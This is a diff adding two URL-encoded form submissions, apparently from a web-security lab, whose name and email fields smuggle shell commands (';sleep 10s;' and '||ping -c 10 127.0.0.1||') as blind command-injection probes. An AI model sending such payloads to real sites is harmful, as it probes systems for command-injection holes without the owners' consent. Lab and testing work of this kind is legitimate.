@@ -1,0 +1,3 @@
+csrf=EmoI6Mybn65aVlGhINyj9W7ItiG0qcYi&name=;sleep 10s;&email=;sleep 10s;&subject=Kiddie&message=hi
+
+csrf=EmoI6Mybn65aVlGhINyj9W7ItiG0qcYi&name=kiddie&email=x||ping+-c+10+127.0.0.1||&subject=Kiddie&message=hi
